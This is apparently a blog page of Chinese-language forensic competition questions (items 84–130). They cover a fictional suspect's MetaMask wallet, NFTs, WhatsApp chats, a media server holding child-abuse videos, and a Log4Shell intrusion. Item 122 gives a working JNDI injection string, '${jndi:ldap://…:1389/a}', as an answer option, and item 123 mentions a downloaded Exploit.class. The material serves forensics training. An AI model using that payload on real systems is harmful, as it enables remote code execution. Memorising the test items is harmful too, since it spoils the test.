<h1 id="84-朗尼在计算机里采用什么浏览器-Browser-及在什么日期时间在他的计算机安装-‘MetaMask’-以时区UTC-8回答-1"><a href="#84-朗尼在计算机里采用什么浏览器-Browser-及在什么日期时间在他的计算机安装-‘MetaMask’-以时区UTC-8回答-1" class="headerlink" title="84    朗尼在计算机里采用什么浏览器 (Browser) 及在什么日期时间在他的计算机安装 ‘MetaMask’ ? (以时区UTC+8回答)    1"></a>84    朗尼在计算机里采用什么浏览器 (Browser) 及在什么日期时间在他的计算机安装 ‘MetaMask’ ? (以时区UTC+8回答)    1</h1><p>单选<br>A:Chrome 2022-08-25 12:35时;<br>B:Chrome 2022-10-07 14:29时;<br>C:Firefox 2022-08-25 12:35时;<br>D:Firefox 2022-10-07 14:29时    </p>
<h1 id="85-朗尼在计算机里所创建的非同质化通证-Non-Fungible-Token-NFT-使用哪一个种区块链-Blockchain-技术-1"><a href="#85-朗尼在计算机里所创建的非同质化通证-Non-Fungible-Token-NFT-使用哪一个种区块链-Blockchain-技术-1" class="headerlink" title="85    朗尼在计算机里所创建的非同质化通证 (Non-Fungible Token - NFT) 使用哪一个种区块链 (Blockchain) 技术?    1"></a>85    朗尼在计算机里所创建的非同质化通证 (Non-Fungible Token - NFT) 使用哪一个种区块链 (Blockchain) 技术?    1</h1><p>单选<br>A:Ethereum;<br>B:Polygon;<br>C:Solana;<br>D:Arbitrum;<br>E:Klaytn    </p>
<h1 id="86-朗尼在什么日期时间把计算机中创建的非同质化通证-NFT-放售-以时区UTC-8回答-2"><a href="#86-朗尼在什么日期时间把计算机中创建的非同质化通证-NFT-放售-以时区UTC-8回答-2" class="headerlink" title="86    朗尼在什么日期时间把计算机中创建的非同质化通证 (NFT) 放售? (以时区UTC+8回答)    2"></a>86    朗尼在什么日期时间把计算机中创建的非同质化通证 (NFT) 放售? (以时区UTC+8回答)    2</h1><p>单选<br>A:2022-10-07 14:47时;<br>B:2022-10-07 14:49时;<br>C:2022-10-07 14:52时;<br>D:2022-10-07 14:54时    </p>
<h1 id="87-朗尼的手机里，有什么应用程序与将黑钱-比特币-转换成另一加密货币的地址有关-2"><a href="#87-朗尼的手机里，有什么应用程序与将黑钱-比特币-转换成另一加密货币的地址有关-2" class="headerlink" title="87    朗尼的手机里，有什么应用程序与将黑钱 (比特币) 转换成另一加密货币的地址有关?    2"></a>87    朗尼的手机里，有什么应用程序与将黑钱 (比特币) 转换成另一加密货币的地址有关?    2</h1><p>多选    A:Metamask;<br>B:Opensea;<br>C:Safepal;<br>D:YouTube    </p>
<h1 id="88-朗尼的手机里，于2022-10-07，15-07时至15-08时做过什么动作-以时区UTC-8回答-2"><a href="#88-朗尼的手机里，于2022-10-07，15-07时至15-08时做过什么动作-以时区UTC-8回答-2" class="headerlink" title="88    朗尼的手机里，于2022-10-07，15:07时至15:08时做过什么动作? (以时区UTC+8回答)    2"></a>88    朗尼的手机里，于2022-10-07，15:07时至15:08时做过什么动作? (以时区UTC+8回答)    2</h1><p>单选<br>A:登录 ‘Metamask’;<br>B:登录 ‘Opensea’;<br>C:屏幕截图 (Screen Capture);<br>D:登录 ‘YouTube’    </p>
<h1 id="89-承上题，从这个动作中能找到什么资讯-1"><a href="#89-承上题，从这个动作中能找到什么资讯-1" class="headerlink" title="89    承上题，从这个动作中能找到什么资讯?    1"></a>89    承上题，从这个动作中能找到什么资讯?    1</h1><p>多选    “A:Opensea.io;<br>B:Ethereum Main Network;<br>C:Your purchase is complete;<br>D:Subtotal = 0.0253 ETH;<br>E:Good Luck<br>“    </p>
<h1 id="90-在朗尼的计算机旁找到-‘MetaMask’-的密码是-‘opensea741’，找出朗尼计算机里的-‘MetaMask’-中有多少加密货币余额-不要输入-‘-’，以阿拉伯数字回答，如-0-137-需回答-0137-2-填空"><a href="#90-在朗尼的计算机旁找到-‘MetaMask’-的密码是-‘opensea741’，找出朗尼计算机里的-‘MetaMask’-中有多少加密货币余额-不要输入-‘-’，以阿拉伯数字回答，如-0-137-需回答-0137-2-填空" class="headerlink" title="90    在朗尼的计算机旁找到 ‘MetaMask’ 的密码是 ‘opensea741’，找出朗尼计算机里的 ‘MetaMask’ 中有多少加密货币余额? (不要输入 ‘.’，以阿拉伯数字回答，如 0.137 需回答 0137)    2    填空"></a>90    在朗尼的计算机旁找到 ‘MetaMask’ 的密码是 ‘opensea741’，找出朗尼计算机里的 ‘MetaMask’ 中有多少加密货币余额? (不要输入 ‘.’，以阿拉伯数字回答，如 0.137 需回答 0137)    2    填空</h1><h1 id="91-朗尼的计算机曾用什么电邮地址登录电邮帐号-不要输入答案中的-‘-’-及-‘-’，以大写英文及阿拉伯数字回答，如-name-mail-com，需回答-NAMEMAILCOM-1-填空"><a href="#91-朗尼的计算机曾用什么电邮地址登录电邮帐号-不要输入答案中的-‘-’-及-‘-’，以大写英文及阿拉伯数字回答，如-name-mail-com，需回答-NAMEMAILCOM-1-填空" class="headerlink" title="91    朗尼的计算机曾用什么电邮地址登录电邮帐号? (不要输入答案中的 ‘@’ 及 ‘.’，以大写英文及阿拉伯数字回答，如 name@mail.com，需回答 NAMEMAILCOM)    1    填空"></a>91    朗尼的计算机曾用什么电邮地址登录电邮帐号? (不要输入答案中的 ‘@’ 及 ‘.’，以大写英文及阿拉伯数字回答，如 name@mail.com，需回答 NAMEMAILCOM)    1    填空</h1><h1 id="92-什么电邮账号曾接收过上述电邮地址发送的电邮？（不要输入答案中的-‘-’-及-‘-’，以大写英文及阿拉伯数字回答，如-name-mail-com，需回答-NAMEMAILCOM）-1-填空"><a href="#92-什么电邮账号曾接收过上述电邮地址发送的电邮？（不要输入答案中的-‘-’-及-‘-’，以大写英文及阿拉伯数字回答，如-name-mail-com，需回答-NAMEMAILCOM）-1-填空" class="headerlink" title="92    什么电邮账号曾接收过上述电邮地址发送的电邮？（不要输入答案中的 ‘@’ 及 ‘.’，以大写英文及阿拉伯数字回答，如 name@mail.com，需回答 NAMEMAILCOM）    1    填空"></a>92    什么电邮账号曾接收过上述电邮地址发送的电邮？（不要输入答案中的 ‘@’ 及 ‘.’，以大写英文及阿拉伯数字回答，如 name@mail.com，需回答 NAMEMAILCOM）    1    填空</h1><h1 id="93-承上题，上述的电邮附件包含哪些类型的档案-3"><a href="#93-承上题，上述的电邮附件包含哪些类型的档案-3" class="headerlink" title="93    承上题，上述的电邮附件包含哪些类型的档案?    3"></a>93    承上题，上述的电邮附件包含哪些类型的档案?    3</h1><p>多选    A:pdf;<br>B:doc;<br>C:png;<br>D:txt;<br>E:jpg    </p>
<h1 id="94-上述电邮附件里的文件，被遮蔽的英文单字是什么-以大写英文回答-3-填空"><a href="#94-上述电邮附件里的文件，被遮蔽的英文单字是什么-以大写英文回答-3-填空" class="headerlink" title="94    上述电邮附件里的文件，被遮蔽的英文单字是什么? (以大写英文回答)    3    填空"></a>94    上述电邮附件里的文件，被遮蔽的英文单字是什么? (以大写英文回答)    3    填空</h1><h1 id="95-根据上述电邮附件里找到的回复种子-Recovery-Seed-，计算朗尼在-‘MetaMask’-使用的以太币-Ethereum-地址。-提示：-BIP-44-derivation-path-m-44’-60’-0’-0-0-以大写英文及阿拉伯数字回答-3-填空"><a href="#95-根据上述电邮附件里找到的回复种子-Recovery-Seed-，计算朗尼在-‘MetaMask’-使用的以太币-Ethereum-地址。-提示：-BIP-44-derivation-path-m-44’-60’-0’-0-0-以大写英文及阿拉伯数字回答-3-填空" class="headerlink" title="95    根据上述电邮附件里找到的回复种子 (Recovery Seed)，计算朗尼在 ‘MetaMask’ 使用的以太币 (Ethereum) 地址。 (提示： BIP-44 derivation path = m/44’/60’/0’/0/0) (以大写英文及阿拉伯数字回答)    3    填空"></a>95    根据上述电邮附件里找到的回复种子 (Recovery Seed)，计算朗尼在 ‘MetaMask’ 使用的以太币 (Ethereum) 地址。 (提示： BIP-44 derivation path = m/44’/60’/0’/0/0) (以大写英文及阿拉伯数字回答)    3    填空</h1><h1 id="96-在2022年9月28日18时51分-UTC-8-，朗尼曾经在手机用WhatsApp与王景浩对话，语句-有灯，风扇经常在转-，-回复这句话的相关语句是什么-1"><a href="#96-在2022年9月28日18时51分-UTC-8-，朗尼曾经在手机用WhatsApp与王景浩对话，语句-有灯，风扇经常在转-，-回复这句话的相关语句是什么-1" class="headerlink" title="96    在2022年9月28日18时51分 (UTC+8)，朗尼曾经在手机用WhatsApp与王景浩对话，语句 [有灯，风扇经常在转]， 回复这句话的相关语句是什么?    1"></a>96    在2022年9月28日18时51分 (UTC+8)，朗尼曾经在手机用WhatsApp与王景浩对话，语句 [有灯，风扇经常在转]， 回复这句话的相关语句是什么?    1</h1><p>单选<br>A:你有推介吗?;<br>B:我之前放在你家的机械运作正常吗?;<br>C:有灯号 风扇有转动?;<br>D:帅吗?    </p>
<h1 id="97-朗尼通过手机相约王景浩于10月15日到哪一个地区食晚饭-1"><a href="#97-朗尼通过手机相约王景浩于10月15日到哪一个地区食晚饭-1" class="headerlink" title="97    朗尼通过手机相约王景浩于10月15日到哪一个地区食晚饭?    1"></a>97    朗尼通过手机相约王景浩于10月15日到哪一个地区食晚饭?    1</h1><p>单选<br>A:荃湾;<br>B:湾仔;<br>C:九龙城;<br>D:九龙塘    </p>
<h1 id="98-朗尼手机的-‘WhatsApp’-号码是什么-号-码-s-whatsapp-net-以阿拉伯数字回答-1-填空"><a href="#98-朗尼手机的-‘WhatsApp’-号码是什么-号-码-s-whatsapp-net-以阿拉伯数字回答-1-填空" class="headerlink" title="98    朗尼手机的 ‘WhatsApp’ 号码是什么?     ( 号 码 )   @s.whatsapp.net? (以阿拉伯数字回答)    1    填空"></a>98    朗尼手机的 ‘WhatsApp’ 号码是什么?     ( 号 码 )   @s.whatsapp.net? (以阿拉伯数字回答)    1    填空</h1><h1 id="99-朗尼的手机曾连接以下哪一个WIFI网络-2"><a href="#99-朗尼的手机曾连接以下哪一个WIFI网络-2" class="headerlink" title="99    朗尼的手机曾连接以下哪一个WIFI网络?    2"></a>99    朗尼的手机曾连接以下哪一个WIFI网络?    2</h1><p>多选    A:taiiphone;<br>B:rooneyhome;<br>C:Function Room;<br>D:TP-Link    </p>
<h1 id="100-朗尼的手机曾连接WIFI-SSID-faifai-它的登录密码是什么-2"><a href="#100-朗尼的手机曾连接WIFI-SSID-faifai-它的登录密码是什么-2" class="headerlink" title="100    朗尼的手机曾连接WIFI [SSID: faifai], 它的登录密码是什么 ?    2"></a>100    朗尼的手机曾连接WIFI [SSID: faifai], 它的登录密码是什么 ?    2</h1><p>单选<br>A:abcd5678;<br>B:aaaa0000;<br>C:rooney111;<br>D:rdfu1234    </p>
<h1 id="101-在朗尼手机于2022年9月30日的-‘WhatsApp’-对话里，有一段音讯-Voice-Message-提到王景浩会给朗尼现金多少作为租用-‘VPN’-的租金-以阿拉伯数字回答-3-填空"><a href="#101-在朗尼手机于2022年9月30日的-‘WhatsApp’-对话里，有一段音讯-Voice-Message-提到王景浩会给朗尼现金多少作为租用-‘VPN’-的租金-以阿拉伯数字回答-3-填空" class="headerlink" title="101    在朗尼手机于2022年9月30日的 ‘WhatsApp’ 对话里，有一段音讯 (Voice Message) 提到王景浩会给朗尼现金多少作为租用 ‘VPN’ 的租金? (以阿拉伯数字回答)    3    填空"></a>101    在朗尼手机于2022年9月30日的 ‘WhatsApp’ 对话里，有一段音讯 (Voice Message) 提到王景浩会给朗尼现金多少作为租用 ‘VPN’ 的租金? (以阿拉伯数字回答)    3    填空</h1><h1 id="102-就AGC集团网络的流媒体服务器-Media-Server-，有多少个本地用户曾经成功登录过-以阿拉伯数字回答-1-填空"><a href="#102-就AGC集团网络的流媒体服务器-Media-Server-，有多少个本地用户曾经成功登录过-以阿拉伯数字回答-1-填空" class="headerlink" title="102    就AGC集团网络的流媒体服务器 (Media Server)，有多少个本地用户曾经成功登录过? (以阿拉伯数字回答)    1    填空"></a>102    就AGC集团网络的流媒体服务器 (Media Server)，有多少个本地用户曾经成功登录过? (以阿拉伯数字回答)    1    填空</h1><h1 id="103-就AGC集团网络的流媒体服务器，有多少个本地用户曾经成功用-‘ssh’-Secure-Shell-登录过-以阿拉伯数字回答-2-填空"><a href="#103-就AGC集团网络的流媒体服务器，有多少个本地用户曾经成功用-‘ssh’-Secure-Shell-登录过-以阿拉伯数字回答-2-填空" class="headerlink" title="103    就AGC集团网络的流媒体服务器，有多少个本地用户曾经成功用 ‘ssh’ (Secure Shell)登录过? (以阿拉伯数字回答)    2    填空"></a>103    就AGC集团网络的流媒体服务器，有多少个本地用户曾经成功用 ‘ssh’ (Secure Shell)登录过? (以阿拉伯数字回答)    2    填空</h1><h1 id="104-就上述的本地用户，成功通过-‘ssh’-登录过该流媒体服务器多少次-以阿拉伯数字回答-3-填空"><a href="#104-就上述的本地用户，成功通过-‘ssh’-登录过该流媒体服务器多少次-以阿拉伯数字回答-3-填空" class="headerlink" title="104    就上述的本地用户，成功通过 ‘ssh’ 登录过该流媒体服务器多少次? (以阿拉伯数字回答)    3    填空"></a>104    就上述的本地用户，成功通过 ‘ssh’ 登录过该流媒体服务器多少次? (以阿拉伯数字回答)    3    填空</h1><h1 id="105-试找找记录失败的登录尝试信息-有以下哪一个名称曾尝试用-‘ssh-notty’-登录该流媒体服务器-2"><a href="#105-试找找记录失败的登录尝试信息-有以下哪一个名称曾尝试用-‘ssh-notty’-登录该流媒体服务器-2" class="headerlink" title="105    试找找记录失败的登录尝试信息. 有以下哪一个名称曾尝试用 ‘ssh:notty’ 登录该流媒体服务器?    2"></a>105    试找找记录失败的登录尝试信息. 有以下哪一个名称曾尝试用 ‘ssh:notty’ 登录该流媒体服务器?    2</h1><p>单选<br>A:iamhacker;<br>B:hacking;<br>C:hack;<br>D:hacker;<br>E:以上皆非    </p>
<h1 id="106-就该流媒体服务器的本地用户-有一个用户名是-‘S’-开头的-该用户的姓氏是什么-以大写英文回答-3-填空"><a href="#106-就该流媒体服务器的本地用户-有一个用户名是-‘S’-开头的-该用户的姓氏是什么-以大写英文回答-3-填空" class="headerlink" title="106    就该流媒体服务器的本地用户, 有一个用户名是 ‘S’ 开头的, 该用户的姓氏是什么? (以大写英文回答)    3    填空"></a>106    就该流媒体服务器的本地用户, 有一个用户名是 ‘S’ 开头的, 该用户的姓氏是什么? (以大写英文回答)    3    填空</h1><h1 id="107-该流媒体服务器是有使用Docker容器-Docker-Container-的，当中包含以下哪个Docker镜像-Docker-Image-3"><a href="#107-该流媒体服务器是有使用Docker容器-Docker-Container-的，当中包含以下哪个Docker镜像-Docker-Image-3" class="headerlink" title="107    该流媒体服务器是有使用Docker容器 (Docker Container) 的，当中包含以下哪个Docker镜像 (Docker Image) ?    3"></a>107    该流媒体服务器是有使用Docker容器 (Docker Container) 的，当中包含以下哪个Docker镜像 (Docker Image) ?    3</h1><p>多选    A:apache2;<br>B:ubuntu;<br>C:centos;<br>D:nginx;<br>E:hello-world;F:以上皆非    </p>
<h1 id="108-就上述的Docker镜像，哪一个镜像在系统上运行中-2"><a href="#108-就上述的Docker镜像，哪一个镜像在系统上运行中-2" class="headerlink" title="108    就上述的Docker镜像，哪一个镜像在系统上运行中?    2"></a>108    就上述的Docker镜像，哪一个镜像在系统上运行中?    2</h1><p>单选<br>A:apache2;<br>B:ubuntu;<br>C:centos;<br>D:nginx;<br>E:hello-world;F:以上皆非    </p>
<h1 id="109-该流媒体服务器是使用-‘WordPress’-建站-Create-Website-的，-就-‘比特币’-标题，-有以下的电子邮箱地址曾经留有评论-2"><a href="#109-该流媒体服务器是使用-‘WordPress’-建站-Create-Website-的，-就-‘比特币’-标题，-有以下的电子邮箱地址曾经留有评论-2" class="headerlink" title="109    该流媒体服务器是使用 ‘WordPress’ 建站 (Create Website) 的， 就 ‘比特币’ 标题， 有以下的电子邮箱地址曾经留有评论?    2"></a>109    该流媒体服务器是使用 ‘WordPress’ 建站 (Create Website) 的， 就 ‘比特币’ 标题， 有以下的电子邮箱地址曾经留有评论?    2</h1><p>多选    A:cn.wordpress.org;<br>B:root58462@mail.qq.com;<br>C:hi456@163.com;<br>D:root@163.com;<br>E:user1@localhost.net;F:以上皆非    </p>
<h1 id="110-该流媒体服务器里其中一个本地用户是有使用-‘calendar’-日历工具的-日历内曾经提及以下哪个网站-3"><a href="#110-该流媒体服务器里其中一个本地用户是有使用-‘calendar’-日历工具的-日历内曾经提及以下哪个网站-3" class="headerlink" title="110    该流媒体服务器里其中一个本地用户是有使用 ‘calendar’ 日历工具的, 日历内曾经提及以下哪个网站?    3"></a>110    该流媒体服务器里其中一个本地用户是有使用 ‘calendar’ 日历工具的, 日历内曾经提及以下哪个网站?    3</h1><p>单选<br>A:<a href="https://weibo.com">https://weibo.com</a>;<br>B:<a href="http://www.baidu.com">http://www.baidu.com</a>;<br>C:<a href="https://www.douyin.com">https://www.douyin.com</a>;<br>D:<a href="https://youku.com">https://youku.com</a>;<br>E:<a href="https://www.binance.com;F:以上皆非">https://www.binance.com;F:以上皆非</a>    </p>
<h1 id="111-该流媒体服务器里是有使用磁盘阵列-RAID-的-该设备是使用哪一个-RAID-级别-请选择最合适的答案-1"><a href="#111-该流媒体服务器里是有使用磁盘阵列-RAID-的-该设备是使用哪一个-RAID-级别-请选择最合适的答案-1" class="headerlink" title="111    该流媒体服务器里是有使用磁盘阵列 (RAID) 的,  该设备是使用哪一个 RAID 级别? (请选择最合适的答案)    1"></a>111    该流媒体服务器里是有使用磁盘阵列 (RAID) 的,  该设备是使用哪一个 RAID 级别? (请选择最合适的答案)    1</h1><p>单选<br>A:RAID 0;<br>B:RAIDz2;<br>C:RAIDz3;<br>D:RAID 10;<br>E:RAID 5;F:以上皆非    </p>
<h1 id="112-该基本镜像存储池-Basic-Storage-Pool-里储存了一些视频档案-请找出一段儿童色情影片-该档案的最后修改时间是什么月份-2"><a href="#112-该基本镜像存储池-Basic-Storage-Pool-里储存了一些视频档案-请找出一段儿童色情影片-该档案的最后修改时间是什么月份-2" class="headerlink" title="112    该基本镜像存储池 (Basic Storage Pool) 里储存了一些视频档案, 请找出一段儿童色情影片, 该档案的最后修改时间是什么月份?    2"></a>112    该基本镜像存储池 (Basic Storage Pool) 里储存了一些视频档案, 请找出一段儿童色情影片, 该档案的最后修改时间是什么月份?    2</h1><p>单选<br>A:Jun;<br>B:Jul;<br>C:Aug;<br>D:Sep;<br>E:Oct;F:以上皆非    </p>
<h1 id="113-承上题，拥有该段儿童色情影片的用户名称是什么-不要输入符号，以大写英文及阿拉伯数字回答-1-填空"><a href="#113-承上题，拥有该段儿童色情影片的用户名称是什么-不要输入符号，以大写英文及阿拉伯数字回答-1-填空" class="headerlink" title="113    承上题，拥有该段儿童色情影片的用户名称是什么?  (不要输入符号，以大写英文及阿拉伯数字回答)    1    填空"></a>113    承上题，拥有该段儿童色情影片的用户名称是什么?  (不要输入符号，以大写英文及阿拉伯数字回答)    1    填空</h1><h1 id="114-就AGC集团网络的流媒体服务器，曾经有用户搜索过有关于儿童色情影片的资料而得到搜索结果，该用户所输入的网址是什么-不要输入符号，以大写英文及阿拉伯数字回答，如-https-web3-com，需回答-HTTPSWEB3COM-2-填空"><a href="#114-就AGC集团网络的流媒体服务器，曾经有用户搜索过有关于儿童色情影片的资料而得到搜索结果，该用户所输入的网址是什么-不要输入符号，以大写英文及阿拉伯数字回答，如-https-web3-com，需回答-HTTPSWEB3COM-2-填空" class="headerlink" title="114    就AGC集团网络的流媒体服务器，曾经有用户搜索过有关于儿童色情影片的资料而得到搜索结果，该用户所输入的网址是什么? (不要输入符号，以大写英文及阿拉伯数字回答，如 https://web3.com，需回答 HTTPSWEB3COM)    2    填空"></a>114    就AGC集团网络的流媒体服务器，曾经有用户搜索过有关于儿童色情影片的资料而得到搜索结果，该用户所输入的网址是什么? (不要输入符号，以大写英文及阿拉伯数字回答，如 <a href="https://web3.com，需回答">https://web3.com，需回答</a> HTTPSWEB3COM)    2    填空</h1><h1 id="115-该基本镜像存储池-pool-有一个快照-Snapshot-，快照的名称是什么-不要输入符号，以大写英文及阿拉伯数字回答，如-media-mediapool-abc123，需回答MEDIAMEDIAPOOLABC123-1-填空"><a href="#115-该基本镜像存储池-pool-有一个快照-Snapshot-，快照的名称是什么-不要输入符号，以大写英文及阿拉伯数字回答，如-media-mediapool-abc123，需回答MEDIAMEDIAPOOLABC123-1-填空" class="headerlink" title="115    该基本镜像存储池 (pool) 有一个快照 (Snapshot)，快照的名称是什么? (不要输入符号，以大写英文及阿拉伯数字回答，如 media/mediapool@abc123，需回答MEDIAMEDIAPOOLABC123)    1    填空"></a>115    该基本镜像存储池 (pool) 有一个快照 (Snapshot)，快照的名称是什么? (不要输入符号，以大写英文及阿拉伯数字回答，如 media/mediapool@abc123，需回答MEDIAMEDIAPOOLABC123)    1    填空</h1><h1 id="116-就上述所找到的基本镜像存储池快照-Snapshot-，它储存了多少个档案-以阿拉伯数字回答-1-填空"><a href="#116-就上述所找到的基本镜像存储池快照-Snapshot-，它储存了多少个档案-以阿拉伯数字回答-1-填空" class="headerlink" title="116    就上述所找到的基本镜像存储池快照 (Snapshot)，它储存了多少个档案? (以阿拉伯数字回答)    1    填空"></a>116    就上述所找到的基本镜像存储池快照 (Snapshot)，它储存了多少个档案? (以阿拉伯数字回答)    1    填空</h1><h1 id="117-王景浩的USB记忆棒里有一个-‘Data’-文件夹-Folder-，它存有哪一种类型的密钥文件-1"><a href="#117-王景浩的USB记忆棒里有一个-‘Data’-文件夹-Folder-，它存有哪一种类型的密钥文件-1" class="headerlink" title="117    王景浩的USB记忆棒里有一个 ‘Data’ 文件夹 (Folder)，它存有哪一种类型的密钥文件?    1"></a>117    王景浩的USB记忆棒里有一个 ‘Data’ 文件夹 (Folder)，它存有哪一种类型的密钥文件?    1</h1><p>单选<br>A:pem;<br>B:cer;<br>C:crt;<br>D:key;<br>E:以上皆非    </p>
<h1 id="118-承上题，’Data’-文件夹里有一个被加密了的档案，它是被哪一种加密方法加密-2"><a href="#118-承上题，’Data’-文件夹里有一个被加密了的档案，它是被哪一种加密方法加密-2" class="headerlink" title="118    承上题，’Data’ 文件夹里有一个被加密了的档案，它是被哪一种加密方法加密?    2"></a>118    承上题，’Data’ 文件夹里有一个被加密了的档案，它是被哪一种加密方法加密?    2</h1><p>多选    A:Symmetric;<br>B:PGP;<br>C:Twofish;<br>D:RSA;<br>E:Triple DES    </p>
<h1 id="119-尝试将档案解密，该档案属于哪一个类型-File-type-2"><a href="#119-尝试将档案解密，该档案属于哪一个类型-File-type-2" class="headerlink" title="119    尝试将档案解密，该档案属于哪一个类型 (File type)?    2"></a>119    尝试将档案解密，该档案属于哪一个类型 (File type)?    2</h1><p>单选<br>A:exe;<br>B:ods;<br>C:rtf;<br>D:sql;<br>E:以上皆非    </p>
<h1 id="120-承上题，找出以下哪一个名字出现在该档案里-3"><a href="#120-承上题，找出以下哪一个名字出现在该档案里-3" class="headerlink" title="120    承上题，找出以下哪一个名字出现在该档案里?    3"></a>120    承上题，找出以下哪一个名字出现在该档案里?    3</h1><p>多选    A:Armand To;<br>B:Adam Smasher;<br>C:Beverly Kot;<br>D:Huma Chan;<br>E:以上皆非    </p>
<h1 id="121-分析IP地址61-238-217-108向AGC服务器10-0-66-184发送的第一个-‘GET’-指令，它请求的统一资源定位系统-Uniform-Resource-Locator-URL-是什么-1"><a href="#121-分析IP地址61-238-217-108向AGC服务器10-0-66-184发送的第一个-‘GET’-指令，它请求的统一资源定位系统-Uniform-Resource-Locator-URL-是什么-1" class="headerlink" title="121    分析IP地址61.238.217.108向AGC服务器10.0.66.184发送的第一个 ‘GET’ 指令，它请求的统一资源定位系统 (Uniform Resource Locator - URL) 是什么?    1"></a>121    分析IP地址61.238.217.108向AGC服务器10.0.66.184发送的第一个 ‘GET’ 指令，它请求的统一资源定位系统 (Uniform Resource Locator - URL) 是什么?    1</h1><p>单选<br>A:<a href="http://155.137.195.111:8080">http://155.137.195.111:8080</a>;<br>B:<a href="http://www.w3.org/2003/05/soap-envelope">http://www.w3.org/2003/05/soap-envelope</a>;<br>C:<a href="http://61.238.217.108:8000">http://61.238.217.108:8000</a>;<br>D:以上皆非    </p>
<h1 id="122-IP地址61-238-217-108曾经向AGC服务器10-0-66-184发送-‘POST’-指令，它在-‘HTML-Form’-项目的-‘uname’-栏所输入的字符串是什么-1"><a href="#122-IP地址61-238-217-108曾经向AGC服务器10-0-66-184发送-‘POST’-指令，它在-‘HTML-Form’-项目的-‘uname’-栏所输入的字符串是什么-1" class="headerlink" title="122    IP地址61.238.217.108曾经向AGC服务器10.0.66.184发送 ‘POST’ 指令，它在 ‘HTML Form’ 项目的 ‘uname’ 栏所输入的字符串是什么?    1"></a>122    IP地址61.238.217.108曾经向AGC服务器10.0.66.184发送 ‘POST’ 指令，它在 ‘HTML Form’ 项目的 ‘uname’ 栏所输入的字符串是什么?    1</h1><p>单选<br>A:root;<br>B:${jndi:ldap://61.238.217.108:1389/a};<br>C:application/x-www-form-urlencoded;<br>D:password    </p>
<h1 id="123-AGC服务器10-0-66-184收到IP地址61-238-217-108的-‘POST’-指令后，它执行了哪些行动-2"><a href="#123-AGC服务器10-0-66-184收到IP地址61-238-217-108的-‘POST’-指令后，它执行了哪些行动-2" class="headerlink" title="123    AGC服务器10.0.66.184收到IP地址61.238.217.108的 ‘POST’ 指令后，它执行了哪些行动?    2"></a>123    AGC服务器10.0.66.184收到IP地址61.238.217.108的 ‘POST’ 指令后，它执行了哪些行动?    2</h1><p>单选<br>A:使用端口46858连接IP地址61.238.217.108的LDAP服务器的指定端口;<br>B:于IP地址61.238.217.108下载了Exploit.class;<br>C:使用端口49264连接IP地址61.238.217.108发送同步要求;<br>D:以上皆是    </p>
<h1 id="124-在上述行动后，IP地址61-238-217-108利用哪个端口-Port-向AGC服务器10-0-66-184发出指令-以阿拉伯数字回答-1-填空"><a href="#124-在上述行动后，IP地址61-238-217-108利用哪个端口-Port-向AGC服务器10-0-66-184发出指令-以阿拉伯数字回答-1-填空" class="headerlink" title="124    在上述行动后，IP地址61.238.217.108利用哪个端口 (Port) 向AGC服务器10.0.66.184发出指令? (以阿拉伯数字回答)    1    填空"></a>124    在上述行动后，IP地址61.238.217.108利用哪个端口 (Port) 向AGC服务器10.0.66.184发出指令? (以阿拉伯数字回答)    1    填空</h1><h1 id="125-AGC服务器10-0-66-184里有一个AGC目录-Directory-，它的子目录-Sub-Directory-包含以下哪一个-2"><a href="#125-AGC服务器10-0-66-184里有一个AGC目录-Directory-，它的子目录-Sub-Directory-包含以下哪一个-2" class="headerlink" title="125    AGC服务器10.0.66.184里有一个AGC目录 (Directory)，它的子目录 (Sub Directory) 包含以下哪一个?    2"></a>125    AGC服务器10.0.66.184里有一个AGC目录 (Directory)，它的子目录 (Sub Directory) 包含以下哪一个?    2</h1><p>多选    A:Accounting;<br>B:Picture;<br>C:Staff;<br>D:Sambashare;<br>E:Retail    </p>
<h1 id="126-入侵者迸入AGC服务器10-0-66-184后，他成功执行以下哪些指令-2"><a href="#126-入侵者迸入AGC服务器10-0-66-184后，他成功执行以下哪些指令-2" class="headerlink" title="126    入侵者迸入AGC服务器10.0.66.184后，他成功执行以下哪些指令?    2"></a>126    入侵者迸入AGC服务器10.0.66.184后，他成功执行以下哪些指令?    2</h1><p>多选    A:檢视了readme.txt内容;<br>B:删除了三个档案;<br>C:删除了一个目录 (Directory);<br>D:替档案改名;<br>E:建立了两个txt档案    </p>
<h1 id="127-入侵者曾经传送一个档案到AGC服务器10-0-66-184并将它改名-Rename-，这个档案的原来名称是什么？-1"><a href="#127-入侵者曾经传送一个档案到AGC服务器10-0-66-184并将它改名-Rename-，这个档案的原来名称是什么？-1" class="headerlink" title="127    入侵者曾经传送一个档案到AGC服务器10.0.66.184并将它改名 (Rename)，这个档案的原来名称是什么？    1"></a>127    入侵者曾经传送一个档案到AGC服务器10.0.66.184并将它改名 (Rename)，这个档案的原来名称是什么？    1</h1><p>单选<br>A:cGhvdG9zT0Zyb2NreQ==;<br>B:Finanical.xls;<br>C:readme.txt;<br>D:anonymous    </p>
<h1 id="128-承上题，该档案原档的建立日期是什么-2"><a href="#128-承上题，该档案原档的建立日期是什么-2" class="headerlink" title="128    承上题，该档案原档的建立日期是什么?    2"></a>128    承上题，该档案原档的建立日期是什么?    2</h1><p>单选<br>A:2022-10-21 08:10:30 (UTC+0);<br>B:2022-10-21 16:19:39 (UTC+0);<br>C:2022-10-22 08:10:30 (UTC+0);<br>D:2022-10-22 14:22:06 (UTC+0);<br>E:2022-10-22 16:19:39(UTC+0)    </p>
<h1 id="129-承上题，该档案的SHA-256哈希值是什么-3"><a href="#129-承上题，该档案的SHA-256哈希值是什么-3" class="headerlink" title="129    承上题，该档案的SHA-256哈希值是什么?    3"></a>129    承上题，该档案的SHA-256哈希值是什么?    3</h1><p>单选<br>A:a6eef1… …27364c;<br>B:54785c… …fe86f0;<br>C:961f2b… …647d55;<br>D:a00e6c… …d0eaab;<br>E:以上皆非    </p>
<h1 id="130-通过取证调查结果迸行分析-包括但不限于以上问题及情节-，以下哪项关于王景浩的推断是正确的-5"><a href="#130-通过取证调查结果迸行分析-包括但不限于以上问题及情节-，以下哪项关于王景浩的推断是正确的-5" class="headerlink" title="130    通过取证调查结果迸行分析 (包括但不限于以上问题及情节)，以下哪项关于王景浩的推断是正确的?    5"></a>130    通过取证调查结果迸行分析 (包括但不限于以上问题及情节)，以下哪项关于王景浩的推断是正确的?    5</h1><p>多选    A:曾经采用他的计算机入侵AGC集团网络;<br>B:傳播儿童色情物品;<br>C:于AGC集团取得大量客户资料;<br>D:通过VPN取得Rooney家里的IP地址;<br>E:企图更改AGC集团的网页    </p>
]]></content>
      <tags>
        <tag>取证</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2024线下赛后感</title>
